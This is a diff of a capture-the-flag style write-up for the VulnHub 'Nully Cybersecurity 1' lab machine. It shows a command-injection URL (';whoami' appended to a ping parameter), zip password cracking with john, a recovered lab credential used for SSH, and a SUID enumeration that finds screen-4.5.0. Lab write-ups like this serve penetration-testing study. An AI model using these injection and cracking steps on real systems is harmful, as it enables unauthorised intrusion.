@@ -1,4 +1,4 @@
-# Nully Cybersecurity 1: Writeup
+# Nully Cybersecurity 1:
 
 Hello, this is my first writeup, while studying for the OSCP certification. This VM (found [here](https://www.vulnhub.com/entry/nully-cybersecurity-1,549/)) was the most enjoyable so far, so I decided to create a writeup on it. It is a nice easy-intermediate level machine, that taught me a lot about pivoting and the metasploit framework.
 
@@ -228,13 +228,13 @@ We get some interesting results back:
 
 GENERATED WORDS: 4612                                                          
 
----- Scanning URL: http://localhost:8899/ ----
-+ http://localhost:8899/index.html (CODE:200|SIZE:209)                                                                                                                                                            
-==> DIRECTORY: http://localhost:8899/ping/                                                                                                                                                                        
-+ http://localhost:8899/robots.txt (CODE:200|SIZE:6)                                                                                                                                                              
-+ http://localhost:8899/server-status (CODE:403|SIZE:276)                                                                                                                                                         
+---- Scanning URL: http://localhost:8888/ ----
++ http://localhost:8888/index.html (CODE:200|SIZE:209)                                                                                                                                                            
+==> DIRECTORY: http://localhost:8888/ping/                                                                                                                                                                        
++ http://localhost:8888/robots.txt (CODE:200|SIZE:6)                                                                                                                                                              
++ http://localhost:8888/server-status (CODE:403|SIZE:276)                                                                                                                                                         
                                                                                                                                                                                                                   
----- Entering directory: http://localhost:8899/ping/ ----
+---- Entering directory: http://localhost:8888/ping/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.                        
     (Use mode '-w' if you want to scan it anyway)
 ```
@@ -246,7 +246,7 @@ Inside it we find a `ping.php` file which is way more interesting as php can be 
 Lets try executing a simple command with `ping.php` from the web browser, like:
 
 ```
-http://localhost:8899/ping/ping.php?host=127.0.0.1;whoami
+http://localhost:8888/ping/ping.php?host=127.0.0.1;whoami
 ```
 
 Not suprisingly, remote code execution is a go as it returns:
@@ -516,4 +516,47 @@ the `file.txt` doesnt contain anything usefull, but .backup.zip is an encrypted 
 
 > Use the open meterpreter shell to download your files locally
 
-I used `john` for the puropse.
+I used `john` for that purpose. So first we need to extract the hash out of the encrypted zip:
+```
+zip2john .backup.zip > hash
+```
+then we crack that and retrieve its password with:
+```
+john --wordlist=../wordlists/rockyou.txt hash
+
+john --show hash
+.backup.zip/creds.txt:1234567890:creds.txt:.backup.zip::.backup.zip
+
+1 password hash cracked, 0 left
+```
+Using this password, we can unzip .backup.txt and read donald's password:
+```
+donald:HBRLoCZ0b9NEgh8vsECS
+```
+Now, sine the last remaining open port of that server is an ssh one. I'm going to try these creds there.
+
+..and BOOM! we're logged in as donald on what seems to be the database server.
+
+Searching for any suid vulnerabilities gives promissing results:
+```
+donald@DatabaseServer:/home$ find / -perm -u=s -type f 2>/dev/null
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/chfn
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/screen-4.5.0
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+donald@DatabaseServer:/home$ ls -lart /usr/bin/screen-4.5.0
+-rwsr-xr-x 1 root root 1860280 Aug 27 09:50 /usr/bin/screen-4.5.0
+```
+screen can be run with root suid! Lets see if we can axploit that.
+There's an interesting exploit on that screen version on (exploitdb)[https://www.exploit-db.com/exploits/41154]:
+
+### To be continued..
+
+
